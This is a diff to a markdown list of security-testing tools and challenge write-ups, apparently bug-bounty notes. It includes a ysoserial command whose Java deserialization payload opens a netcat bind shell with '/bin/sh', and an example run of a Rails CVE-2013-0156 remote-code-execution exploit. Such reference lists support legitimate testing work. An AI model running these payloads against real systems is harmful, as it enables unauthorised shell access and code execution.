@@ -95,8 +95,9 @@ Tools:
 - [requestbin](https://requestbin.com)
 - [webhook site](https://webhook.site/)
 - [ssrftest](https://ssrftest.com)
-- [ysoserial: tool for generating payloads that exploit unsafe Java object deserialization](https://github.com/frohoff/ysoserial)
+- [ObjectInputStream with ysoserial: tool for generating payloads that exploit unsafe Java object deserialization](https://github.com/frohoff/ysoserial)
 example: java -jar ysoserial-0.0.4-all.jar Spring1 "/usr/bin/nc -l -p 9999 -e /bin/sh" | base64
+- [CVE-2013-0156: Rails Object Injection](https://gist.github.com/postmodern/4499206) example: rails_rce.rb http://localhost:3000/secrets/search "puts 'lol'"
 
 Intigriti Challenges 
 - March 2021 [Intigriti — XSS Challenge 0321 XSS with CSRF Bypass](https://fh4ntke.medium.com/intigriti-xss-challenge-0321-472ae0a48254)
